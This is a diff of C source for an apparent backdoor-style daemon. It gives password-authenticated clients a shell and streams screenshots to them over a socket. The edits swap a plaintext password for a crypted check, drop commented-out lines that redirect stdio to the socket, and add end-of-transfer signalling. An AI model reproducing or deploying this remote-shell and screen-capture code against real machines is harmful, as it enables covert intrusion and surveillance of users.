@@ -112,6 +112,7 @@ static void	spawn_shell(t_users *users, char **envp)
 		waitpid(pid, &status, 0);
 		kill(pid, SIGTERM);
 	}
+	exit(0);
 }
 
 static void	screenshot(t_users *users, char **envp)
@@ -132,9 +133,6 @@ static void	screenshot(t_users *users, char **envp)
 		perror("fork failed");
 	else if (pid == 0)
 	{
-		/*chdir("/tmp");*/
-		/*for(int i = 0; i < 3; i++)*/
-			/*dup2(users->sd, i);*/
 		if ((ret = execve(screen[0], screen, envp)) == -1)
 			perror("execve");
 	}
@@ -156,7 +154,9 @@ static void	screenshot(t_users *users, char **envp)
 		else
 			send(users->sd, &img, (size_t)ret_read, 0);
 		img_size -= (size_t)ret_read;
+		memset(&img, 0, sizeof(img));
 	}
+	send(users->sd, "finish", 6, 0);
 	unlink("/tmp/test1.png");
 }
 
@@ -222,7 +222,8 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 					buffer[valrecv -1] = '\0';
 					if (users.key[users.i] == false)
 					{
-						if (!strcmp(buffer, "rabougue"))
+						ft_crypt(buffer, (off_t)strlen(buffer));
+						if (!strcmp(buffer, PSWD))
 							users.key[users.i] = true;
 					}
 					else
